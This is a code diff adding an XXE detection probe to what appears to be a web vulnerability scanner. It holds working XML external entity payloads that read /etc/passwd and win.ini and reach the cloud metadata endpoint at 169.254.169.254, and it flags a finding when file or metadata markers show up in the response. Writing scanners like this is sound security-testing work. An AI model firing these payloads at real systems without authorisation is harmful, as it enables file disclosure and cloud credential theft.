@@ -399,3 +399,44 @@ def probe_ssrf(ctx: Context, url: str, param: str) -> dict:
         verdict = "no ssrf signal"
     return {"verdict": verdict, "canary_id": base["request_id"],
             "results": hits}
+
+
+def probe_xxe(ctx: Context, url: str) -> dict:
+    """XXE matched-pair: baseline is a plain XML POST, then doctype
+    payloads declaring external entities (local file, cloud metadata).
+    File/metadata bytes in the echoed body are the signal."""
+    hdr = {"Content-Type": "application/xml"}
+    base = ctx.client.send("POST", url, headers=hdr,
+                           body="<r>argus</r>", tool="probe_xxe",
+                           note="plain xml baseline")
+    payloads = [
+        ("file-read",
+         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
+         '"file:///etc/passwd">]><r>&xxe;</r>'),
+        ("file-read-win",
+         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
+         '"file:///c:/windows/win.ini">]><r>&xxe;</r>'),
+        ("ssrf-via-xxe",
+         '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM '
+         '"http://169.254.169.254/latest/meta-data/">]><r>&xxe;</r>'),
+    ]
+    hits = []
+    for name, doc in payloads:
+        r = ctx.client.send("POST", url, headers=hdr, body=doc,
+                            tool="probe_xxe", note=name)
+        body = r.get("body") or ""
+        lfi = LFI_MARKERS.search(body)
+        meta = _SSRF_MARKERS.search(body)
+        hits.append({"name": name, "status": r["status"],
+                     "request_id": r["request_id"],
+                     "marker": (lfi or meta).group(0) if (lfi or meta) else None,
+                     "similarity_to_base": _similarity(
+                         body, base.get("body") or "")})
+    strong = next((h for h in hits if h["marker"]), None)
+    if strong:
+        verdict = (f"xxe candidate: marker '{strong['marker']}' resolved "
+                   f"inside the XML response ({strong['name']})")
+    else:
+        verdict = "no xxe signal"
+    return {"verdict": verdict, "base_id": base["request_id"],
+            "results": hits}
